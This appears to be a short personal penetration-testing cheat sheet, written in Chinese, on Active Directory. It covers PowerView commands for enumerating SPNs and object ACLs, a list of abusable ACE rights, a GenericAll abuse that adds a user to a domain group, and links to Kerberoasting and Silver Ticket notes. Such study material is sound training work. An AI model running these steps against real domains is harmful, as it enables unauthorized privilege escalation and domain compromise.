### SPNs
**枚举域中的SPN，获取域中的服务端口**。同样可以达成nmap端口扫描的目的，甚至更为准确。
```powershell
setspn -L <service_name>

#PowerView
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
### ACEs --> ACL 
 SecurityIdentifier 权限主体 -->   ActiveDirectoryRights 权限等级
```powershell
Get-ObjectAcl -Identity stephanie
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Convert-SidToName <SID>
"<SID1>","<SID2>".. | Convert-SidToName
```
#### 重点ACEs
```powershell
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
# Exploit
## ACL manipulate With GenericALL
```powershell
net group "<GenericALL Group>" <user> /add /domain
runas /user:<GenericALL user> powershell
```
## Kerberoasting
[[My Cheat Sheet/4. POST/Windows & Domain PrivEsc/0. Quick_Note&Domain/Whole Domain Stuff/A. Authentication Attack/Cracker#Kerberoasting|Kerberoasting]]
## Silver Ticket
[[Silver Ticket#Silver Tickets|Silver Tickets]]